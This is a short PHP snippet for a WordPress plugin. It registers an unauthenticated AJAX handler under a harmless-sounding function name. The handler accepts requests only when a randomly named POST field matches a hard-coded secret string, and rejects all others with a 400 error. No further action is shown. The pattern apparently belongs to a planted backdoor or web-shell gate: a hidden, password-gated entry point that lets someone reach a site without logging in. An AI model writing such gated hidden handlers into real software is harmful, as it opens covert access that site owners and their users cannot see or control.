<?php

function max_addons_rss() {
	if (!isset($_POST["vmbuvmpvg"]) || $_POST["vmbuvmpvg"] !== "w6HNZ4CAZcI6hAk") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'max_addons_rss', 5, 1);
